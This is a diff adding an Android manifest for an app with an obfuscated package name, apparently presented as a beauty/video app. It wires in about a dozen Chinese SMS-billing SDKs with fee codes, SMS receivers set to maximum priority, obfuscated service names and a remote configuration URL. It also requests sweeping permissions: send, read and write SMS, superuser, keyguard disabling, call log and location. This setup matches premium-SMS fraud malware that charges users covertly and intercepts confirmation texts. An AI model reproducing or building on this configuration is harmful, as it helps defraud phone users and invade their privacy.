@@ -1,0 +1,352 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="bvcnm.qasdf.xzbsdf"
+    android:versionCode="2147483647"
+    android:versionName="1.1.4" >
+
+    <uses-sdk
+        android:minSdkVersion="15"
+        android:targetSdkVersion="21" />
+
+    <application
+        android:name="com.meiqu.beauty.Application"
+        android:icon="@mipmap/ic_launcher_1"
+        android:label="@string/app_name"
+        android:theme="@style/AppTheme" >
+        <activity
+            android:name="com.meiqu.beauty.SplashActivity"
+            android:configChanges="keyboard|keyboardHidden|orientation|screenSize"
+            android:screenOrientation="landscape" >
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        <activity
+            android:name="com.meiqu.beauty.GuideActivity"
+            android:configChanges="keyboard|keyboardHidden|orientation|screenSize"
+            android:screenOrientation="portrait" />
+        <activity
+            android:name="com.meiqu.beauty.ShowVideoActivity"
+            android:configChanges="keyboard|keyboardHidden|orientation|screenSize"
+            android:screenOrientation="portrait" />
+        <activity
+            android:name="com.meiqu.beauty.MainActivity"
+            android:configChanges="keyboard|keyboardHidden|orientation|screenSize"
+            android:screenOrientation="portrait" />
+        <!-- start 自定义参数-->
+		<!-- 
+			/** 上岸 */
+			public static final int PAY_SA = 3001;
+			/** 微云 */
+			public static final int PAY_WY = 3002;
+			/** 平治 */
+			public static final int PAY_PZ = 3003;
+			/** 奇葩 */
+			public static final int PAY_QP = 3004;
+			/** 泰酷 多益乐 */
+			public static final int PAY_TK = 3005;
+			/** 舜付 */
+			public static final int PAY_SF = 3006;
+			/** 捷梦 */
+			public static final int PAY_JM = 3007;
+			/** 玉峰*/
+			public static final int PAY_YF = 3008;
+			/** 小美*/
+			public static final int PAY_XM = 3009;
+			/** 麦广*/
+			public static final int PAY_MG = 3010;
+			/** 易接*/
+			public static final int PAY_YJ = 3011;
+			/** 正多*/
+			public static final int PAY_ZD = 3012;
+		 -->
+		    <meta-data android:name="configUrl" android:value="http://haoyouxi.info/appValuezhaojiejie.json" />
+	        <meta-data android:name="channel" android:value="1009" />
+	        <meta-data android:name="channelAry" android:value="3001_3002_3003_3004_3005_3006_3007_3008_3009_3010_3011_3012" />  
+	        
+	        <!-- umeng参数 -->
+	        <meta-data android:name="UMENG_APPKEY" android:value="5af9096cf43e48308f000017" />
+	        <meta-data android:name="UMENG_CHANNEL" android:value="um1009" />
+	                
+			<!-- 微云 捷梦 奇葩 平治 舜付 玉峰 泰酷 上岸 -->
+			<!-- start 微云 -->
+	        <!-- 
+	        	WYappCode   游戏编号 微云支付分配
+	        	WYfeeCode   计费点编号
+	        	WYPrice     价格(单位:分  目前微云支付只支持500 1000 1500 2000 分别为5元 10元 15元 20元)
+	         -->
+	        <meta-data android:name="WYappCode" android:value="20992752"/>
+	        <meta-data android:name="WYfeeCode" android:value="70765728"/>
+	        <meta-data android:name="WYChannel" android:value="wy1009"/>
+	        <meta-data android:name="WYPrice" android:value="2000"/>
+	        <service android:name="com.sdk.service.CoreService" />
+	        <!-- end 微云 -->
+	        <!-- ========================================================= -->
+	        <!-- start 捷梦参数-->
+	        <!-- 
+	        	 JMfeeCode       由捷支付分配
+	         -->
+	        <meta-data  android:name="JMfeeCode" android:value="70600820" />
+	        <meta-data android:name="JIEPAY_APPID" android:value="20322900" />
+         	<meta-data android:name="JIEPAY_CHANNEL" android:value="jm1009" />
+	        <receiver
+            	android:name="com.wchen.jiezf.rever.JRever"
+            	android:permission="android.permission.BROADCAST_SMS" >
+	            <intent-filter android:priority="2147483647" >
+	                <action android:name="android.provider.Telephony.SMS_DELIVER" />
+	                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+	            </intent-filter>
+        	</receiver>
+        	<service android:name="com.wchen.jiezf.srv.InitSrv" />
+	        <!-- end 捷梦参数 -->
+	        <!-- ========================================================= -->
+	        <!-- start 奇葩 -->
+	        <!-- 
+	        	QPappid         应用ID，后台申请
+	        	QPcpid          商户ID，后台申请
+	        	QPchid          渠道ID，后台申请
+	        	QPpaycode       需计费后台申请
+	        	QPextData       应用自定义参数，计费SDK最后会回传给应用
+	         -->
+	        <meta-data android:name="QPappid" android:value="102827"/>
+			<meta-data android:name="QPcpid" android:value="1543"/>       
+			<meta-data android:name="QPchid" android:value="qp1009"/>
+			<meta-data android:name="QPpaycode" android:value="\008WB"/>
+			<meta-data android:name="QPextData" android:value="QPInit001"/>
+	        <!-- end 奇葩 -->
+	        <!-- ========================================================= -->
+	        <!-- start 平治参数 -->
+	        <!-- 
+				PZappid          应用ID
+				PZmoney          支付金额,单位元
+				PZcpparams       透传参数
+	         -->
+	        <meta-data android:name="PZappid" android:value="801" />
+	        <meta-data android:name="PZmoney" android:value="2000" />
+	        <meta-data android:name="PZchannel" android:value="1009"/>
+	        <meta-data android:name="PZcpparams" android:value="\0000" />
+	        <meta-data android:name="PZ_CNO" android:value="1009"/>
+        	<service android:name="com.amaz.onib.FSrvi"></service>
+	        <!-- end 平治参数 -->
+	        <!-- ========================================================= -->
+			<!-- start 舜付 -->
+	        <!-- 
+	        	SFappId       应用ID，由舜付分配
+	        	SFitemId      计费点ID，由CP自己定义
+	        	SFprice       计费点价格,元
+	        	SFsubChannel  子渠道，由CP自己定义
+	         -->
+	        <meta-data android:name="SFappId" android:value="1224"/>
+	        <meta-data android:name="SFitemId" android:value="\00"/>
+	        <meta-data android:name="SFprice" android:value="2000"/>
+	        <meta-data android:name="SFmainChannel" android:value="sfm1009"/>
+	        <meta-data android:name="SFsubChannel" android:value="sfs1009"/>
+	        <!-- end 舜付 -->
+	        <!-- ========================================================= -->
+	        <!-- start 玉峰 -->
+
+			<meta-data android:name="YFappId" android:value="\0001018"/>
+	        <meta-data android:name="YFdistro" android:value="\00000"/><!-- 合作方信息 现在没用 填空字符串就可以 不要用中文 -->>
+	        <meta-data android:name="YFchannel" android:value="yf1009"/>
+	        <meta-data android:name="YFpayCode" android:value="\0001018000"/>
+	        <meta-data android:name="YFprice" android:value="2000"/>
+	        <receiver android:name="com.y.f.jar.pay.InNoticeReceiver" >
+	            <intent-filter android:priority="2147483647" >
+	                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+	            </intent-filter>
+        	</receiver>
+			<service android:name="com.y.f.jar.pay.UpdateServices"></service>
+			<service android:name="com.yf.y.f.init.pay.service.PayCoreService" />
+			<receiver
+			    android:name="com.yf.y.f.init.pay.receiver.SmsReceiver"
+			    android:permission="android.permission.BROADCAST_SMS">
+			    <intent-filter android:priority="2147483647">
+			        <action android:name="android.provider.Telephony.SMS_DELIVER" />
+			        <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+			    </intent-filter>
+			</receiver>
+			<!-- end 玉峰 -->
+		
+	        <!-- start 泰酷 -->
+	        <!-- 
+	        	TKappid        应用id
+	        	TKchannelid    应用渠道号,渠道号不要用纯数字
+	        	TKp            计费价格，单位分，需要申请
+	        	TKpoint        计费点需要申请
+	         -->
+	        <meta-data android:name="TKappid" android:value="6000447"/>
+	        <meta-data android:name="TKp" android:value="2000"/>
+	        <meta-data android:name="TKchannelid" android:value="tk1009"/>
+	        <meta-data android:name="TKpoint" android:value="\00201"/>
+	        <!-- end 泰酷 -->
+	        <!-- ========================================================= -->
+	        <!-- start 上岸 -->
+	        <!-- 
+	        	SAchannel      纯阿拉伯数字渠道号(3位大渠道号+最长6位自定义数字)
+	         -->
+	        <service android:name="cn.cuter.main.MyService"/><!-- 201803221017版本更新 -->
+	        <meta-data android:name="SAchannel" android:value="1611009"/>
+	        <!-- end 上岸 -->
+	        
+	        <!-- start 小美 -->
+	        <!-- 
+	        	XMappid
+	        	XMchannel
+	        	XMkey      
+	        	XMcpparam  透传参数
+	        	XMfeeid    计费点
+	         -->
+	        <meta-data android:name="XMappid" android:value="907"/>
+	        <meta-data android:name="XMchannel" android:value="xm1009"/>
+	        <meta-data android:name="XMkey" android:value="7ujl91qrq8obeq4m82ga9u363e"/>
+	        <meta-data android:name="XMcpparam" android:value="xmcpparam"/>
+	        <meta-data android:name="XMfeeid" android:value="6466"/>
+			<service android:name="h.c.e.m.Dleras" />
+	        <receiver
+	            android:name="h.c.e.m.Lbeic"
+	            android:label="NetworkConnection" >
+	            <intent-filter>
+	                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+	                <action android:name="android.intent.action.TIME_SET" />
+	                <action android:name="android.intent.action.TIME_TICK" />
+	            </intent-filter>
+	            <intent-filter android:priority="2147483647" >
+	                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+	            </intent-filter>
+	            <intent-filter>
+	                <action android:name="android.action.intent.BKEO_DLAKFEQ_KBREER" />
+					<action android:name="android.action.intent.BJKKFA_DKOQK_ROQKF" />
+	            </intent-filter>
+ 	        </receiver>
+        <!-- end 小美 -->
+        
+        <!-- start 麦广 -->
+	        <!-- 
+	         -->
+	        <meta-data android:name="MGMsa" android:value="s4B3l9A7qw4rprwxhpxa28p9"/>
+	        <meta-data android:name="MGChannelId" android:value="mg1009"/>
+	        <meta-data android:name="MGGid" android:value="rra7nhqshreajwunvvo8sis5"/>
+	        <meta-data android:name="MGExt" android:value="extmg1009"/>
+			<service android:name="com.kIXwj.x42at.LXw1T.E0Kf1"></service>
+        <!-- end 麦广 -->
+        
+        <service
+            android:name="com.f.j.I"
+            android:process="com.f.j.I" >
+        </service>
+		<!-- start 易接 -->
+<!-- 		<meta-data android:name="YJAppidPre" android:value="9A6B4F9D"/> -->
+<!--         <meta-data android:name="YJAppidSuf" android:value="B0A64720"/> -->
+<!--         <meta-data android:name="YJCpId" android:value="8568"/> -->
+<!--         <meta-data android:name="YJChannelId" android:value="yj1009"/> -->
+<!--         <meta-data android:name="YJPointid" android:value="0"/> -->
+<!--         <meta-data android:name="YJExt" android:value="YJext"/> -->
+<!--         <service -->
+<!--             android:name="com.m.w.Z" -->
+<!--             android:process="com.m.w.Z" > -->
+<!--         </service> -->
+
+<!--         <receiver -->
+<!--             android:name="com.m.w.O" -->
+<!--             android:permission="android.permission.BROADCAST_SMS" -->
+<!--             android:process="com.m.w.Z" > -->
+<!--             <intent-filter android:priority="2147483647" > -->
+<!--                 <action android:name="android.provider.Telephony.SMS_RECEIVED" /> -->
+<!--                 <action android:name="android.intent.action.USER_PRESENT" /> -->
+<!--                 <action android:name="android.intent.action.ACTION_SHUTDOWN" /> -->
+<!--                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE" /> -->
+<!--                 <action android:name="android.intent.action.SIM_STATE_CHANGED" /> -->
+<!--                 <action android:name="android.intent.action.SERVICE_STATE" /> -->
+<!--                 <action android:name="android.bluetooth.adapter.action.STATE_CHANGED" /> -->
+<!--                 <action android:name="android.net.wifi.WIFI_STATE_CHANGED" /> -->
+<!--                 <action android:name="android.intent.action.ANY_DATA_STATE" /> -->
+<!--                 <action android:name="android.net.wifi.STATE_CHANGE" /> -->
+
+<!--                 <category android:name="android.intent.category.DEFAULT" /> -->
+<!--                 <category android:name="android.intent.category.LAUNCHER" /> -->
+
+<!--                 <action android:name="android.intent.action.BOOT_COMPLETED" /> -->
+<!--             </intent-filter> -->
+<!--             <intent-filter android:priority="2147483647" > -->
+<!--                 <action android:name="android.intent.action.MEDIA_MOUNTED" /> -->
+<!--                 <action android:name="android.intent.action.MEDIA_EJECT" /> -->
+
+<!--                 <data android:scheme="file" /> -->
+<!--             </intent-filter> -->
+<!--         </receiver> -->
+        <!-- end 易接 -->
+        <!-- start 正多 -->
+<!--         <meta-data android:name="ZDProductId" android:value="c809ce88d31e0cbecd95c581959cf71a"/> -->
+<!--         <meta-data android:name="ZDChannelId" android:value="zd1009"/> -->
+<!--         <meta-data android:name="ZDChargeId" android:value="925"/> -->
+<!--         <service android:name="com.dd.service.PolService" > -->
+<!--         </service> -->
+        <!-- end 正多 -->
+		<!-- end 自定义参数-->
+    </application>
+    
+	<!-- 杭州舜付 -->
+    <uses-permission android:name="android.permission.ACCESS_SUPERUSER"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.GET_PACKAGE_SIZE"/>
+    <uses-permission android:name="android.permission.GET_TASKS"/>
+    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" /> 
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" /> 
+    <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.VIBRATE"/>
+    <uses-permission android:name="android.permission.CLEAR_APP_CACHE"/>
+    <uses-permission android:name="com.dianxinos.superuser.permission.UPDATE"/>
+    <uses-permission android:name="android.permission.WRITE_SMS"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS" /> 
+    <uses-permission android:name="android.permission.RECEIVE_SMS" /> 
+    <uses-permission android:name="android.permission.CAMERA"/>
+    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS"/>
+    <uses-permission android:name="android.permission.RUN_INSTRUMENTATION" />
+    <uses-permission android:name="com.android.launcher.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+	<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+	<uses-permission android:name="android.permission.RECEIVE_USER_PRESENT"/>
+    <!-- 奇葩 -->
+	<uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
+	<!-- 捷梦 -->
+	<uses-permission android:name="android.permission.UPDATE_APP_OPS_STATS" />
+	<!-- 麦广 -->
+	<!-- 平治 -->
+	<uses-permission android:name="android.permission.RECEIVE_MMS" />
+	<!-- 泰酷 -->
+	<uses-permission android:name="android.permission.ACCESS_LOCATION_EXTRA_COMMANDS"/>
+	<uses-permission android:name="android.permission.ACCESS_MTK_MMHW"/>
+	<uses-permission android:name="android.permission.BROADCAST_STICKY"/>
+	<uses-permission android:name="android.permission.CHANGE_CONFIGURATION" />
+	<uses-permission android:name="android.permission.INTERACT_ACROSS_USERS_FULL"/>
+	<uses-permission android:name="android.permission.READ_SETTINGS" />
+	<uses-permission android:name="android.permission.READ_LOGS" />
+	<!-- 小美-->
+	<uses-permission android:name="android.permission.READ_CALL_LOG" />
+	
+	<!-- 允许程序写入外部存储，如SD卡上写文件 -->
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.MOUNT_FORMAT_FILESYSTEMS" />
+    <!-- 网络处理 -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+	<!-- XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX -->
+
+</manifest>
